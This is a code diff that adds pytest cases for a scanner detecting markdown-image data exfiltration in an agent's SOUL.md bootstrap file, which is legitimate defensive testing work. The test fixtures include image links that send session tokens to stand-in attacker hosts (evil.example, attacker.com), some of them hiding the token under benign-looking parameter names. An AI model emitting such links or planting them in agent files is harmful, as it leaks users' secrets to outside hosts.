@@ -66,6 +66,39 @@ def test_b59_pass_data_uri():
     assert f.status == PASS
 
 
+def test_b59_pass_badge_and_utm_query_not_exfil():
+    """B-181: a README badge on a known badge host, and a link whose only query keys are
+    benign display/analytics params (style, logo, utm_*), are not data-bearing exfil → PASS."""
+    for md in [
+        "![build](https://img.shields.io/badge/build-passing-green?style=flat&logo=github)",
+        "![cov](https://codecov.io/gh/o/r/branch/main/graph/badge.svg?token=)",
+        "[docs](https://example.com/guide?utm_source=readme&utm_medium=badge&style=flat)",
+    ]:
+        f = check_markdown_image_exfil(_ctx(bootstrap={"SOUL.md": md}))
+        assert f.status == PASS, f"badge/utm URL wrongly flagged: {md!r} -> {f.detail}"
+
+
+def test_b59_warn_real_exfil_query_on_untrusted_host():
+    """B-181: a data-bearing query on a non-badge host (a session token in the URL) still
+    WARNs — the allowlist requires ALL params benign / the exact badge host."""
+    f = check_markdown_image_exfil(_ctx(
+        bootstrap={"SOUL.md": "![x](https://evil.example/collect?data=SESSION_TOKEN_HERE)"}
+    ))
+    assert f.status == WARN
+
+
+def test_b59_warn_benign_param_name_with_token_value():
+    # B-181 (C-135 r2): the benign-param allowlist must check VALUES too — a token-shaped
+    # value (20+ opaque chars with a digit) under a benign param name ("?utm_source=<secret>",
+    # "?style=<base64>") is exfil to an attacker host, not a campaign label, so it still WARNs.
+    for md in [
+        "![x](https://evil.example/c?utm_source=SESSION_TOKEN_abc123def456ghi789xyz)",
+        "![x](https://attacker.com/p?style=eyJ0abc123defXYZ456ghiJKL789mnoPQR)",
+    ]:
+        f = check_markdown_image_exfil(_ctx(bootstrap={"SOUL.md": md}))
+        assert f.status == WARN, f"token value under a benign param name laundered: {md!r}"
+
+
 def test_b59_pass_plain_http_no_query():
     """Plain http:// with no query string must be clean."""
     f = check_markdown_image_exfil(_ctx(
